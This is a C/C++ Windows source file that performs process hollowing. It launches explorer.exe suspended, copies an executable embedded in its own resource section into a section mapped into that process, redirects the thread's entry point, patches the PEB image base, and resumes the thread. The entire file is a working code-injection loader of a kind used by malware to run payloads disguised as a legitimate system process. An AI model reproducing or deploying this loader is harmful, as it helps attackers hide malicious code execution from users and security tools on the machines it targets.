#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;

	const int baseAddrLength = 4;
	const int pebImageBaseAddrOffset = 8;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
	FARPROC fpZwCreateSection = GetProcAddress(handleNtDll, "ZwCreateSection");
	FARPROC fpZwMapViewOfSection = GetProcAddress(handleNtDll, "ZwMapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	_ZwCreateSection ZwCreateSection = (_ZwCreateSection)fpZwCreateSection;
	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection)fpZwMapViewOfSection;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed (%d).\n", GetLastError());
	}


	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB peb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);

	/* Find and load exe stored in the PE's resource section */
	HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL rescData = LoadResource(NULL, resc);

	/* Get pointer to the resource base address */
	LPVOID lpmyExe = LockResource(rescData);


	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpmyExe;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	HANDLE secHandle = NULL;

	LARGE_INTEGER pLargeInt;
	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;

	SIZE_T commitSize = pNTHeaderResource->OptionalHeader.SizeOfImage;
	SIZE_T viewSizeThisProcess = 0;
	SIZE_T viewSizeCreatedPrcess = 0;

	PVOID sectionBaseAddressThisProcess = NULL;
	PVOID sectionBaseAddressCreatedProcess = NULL;

	/* Create the section object which will be shared by both the current and created process */
	ZwCreateSection(&secHandle, SECTION_ALL_ACCESS, NULL, &pLargeInt, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	/* Map the created section into the current process's virtual address space */
	ZwMapViewOfSection(secHandle, GetCurrentProcess(), &sectionBaseAddressThisProcess, NULL, NULL, NULL, &viewSizeThisProcess, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	
	/* Map the created section into the created process's virtual address space */
	ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);

	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);

	/* Copy the headers of the process that is to be injected into the created process */
	if (!WriteProcessMemory(GetCurrentProcess(), sectionBaseAddressThisProcess, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
		return -1;
	}
	
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);

	/* Copy the sections of the process that is to be injected into the created process */
	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
	{
		printf("Copying data from: %s\n", pSectionHeader->Name);

		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];

		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);

		if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)sectionBaseAddressThisProcess + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());

			return -1;
		}
		pSectionHeader++;
	}

	/* Unmap the shared section from the current process's virutal address space */
	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddressThisProcess);

	/* Retrieve the suspended procceses current context */
	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);

	/* Set the Orginal Entry Point (OEP) value */
	lpContext->Eax = (DWORD)sectionBaseAddressCreatedProcess + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;

	/* Set the suspended exe context with the updated eax value which points to the injected code */
	SetThreadContext(pi.hThread, lpContext);

	//DWORD  temp = (DWORD)sectionBaseAddressCreatedProcess;
	//DWORD* pTemp = &temp;
	
	/* Overwrite the PEB base address with the image base address of the injected exe */
	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &sectionBaseAddressCreatedProcess, baseAddrLength, NULL);

	/* Resume the created processes main thread with the updated OEP */
	ResumeThread(pi.hThread);
	

	printf("\nCreated Process id: %i\n", pi.dwProcessId);
	printf("Injected process Image Base Address 0x%x\n", sectionBaseAddressCreatedProcess);

	return 0;
}